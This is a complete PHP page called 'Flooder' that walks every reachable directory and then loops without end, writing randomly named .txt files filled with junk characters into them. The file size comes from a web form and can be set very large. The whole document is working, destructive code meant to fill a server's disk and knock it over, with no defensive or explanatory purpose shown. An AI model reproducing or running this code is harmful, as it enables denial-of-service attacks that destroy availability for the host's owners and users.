<?php

function get_directories_sub(){
    $dir = getcwd();
    $dirs = explode('/', $dir);
    $dirs_main = [];
    $s = '';
    for($n = 0; $n < count($dirs); $n++){
        $s .= $dirs[$n] . '/';
        array_push($dirs_main, $s);
    }

    return $dirs_main;
}

function get_directories_main(){
    $dirs = [];
    foreach(get_directories_sub() as $main){
        try{
            $it = new RecursiveTreeIterator(new RecursiveDirectoryIterator($main, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach($it as $path) {
                if(!pathinfo($path, PATHINFO_EXTENSION)){
                    $index = strpos($path, '-');
                    array_push($dirs, substr($path, $index + 1, iconv_strlen($path)));
                }
            }
        }catch(Exception $e){
            
        }
    }

    return $dirs;
}

function create_name(){
    $s = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n');
    $name = '/';
    for($i = 0; $i < 10; $i++){
        $name .= $s[rand(0,13)];
    }

    return $name . '.txt';
}

function dump($path, $size){
    $file = fopen($path, 'w');
    $s = str_repeat("<>?!@#$$%&", $size);
    fwrite($file, $s);
    fclose($file);
}

function start($size){
    $dirs = get_directories_main();
    $c = 0;
    while(true){
        try{
            $path_index = array_rand($dirs, 1);
            $name = create_name();
            dump($dirs[$path_index] . $name, $size);
            $c++;
            echo "<script>document.getElementById('c').innerHTML = 'Files created: $c'</script>";
        }catch(Exception $e){
            echo $e . "<br>";
        }
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Flooder</title>
</head>
<body>
    <form action="" method="post">
        <label for='size'>Size of files:</label>
        <input type='number' name='size' id='size' min='1' max = '44000000'>
        <input type='submit' name='submit' id='submit' value='Start'>
        <p1>1 -> 0.1 kb</p1>
        <br><br>
        <p id="c">Files created:</p>
        <?php
            if(isset($_POST['submit'])){
                $size = $_POST['size'];
                echo '<br>';
                start($size);
            } else {
            }
        ?>
    </form>
</body>
</html>
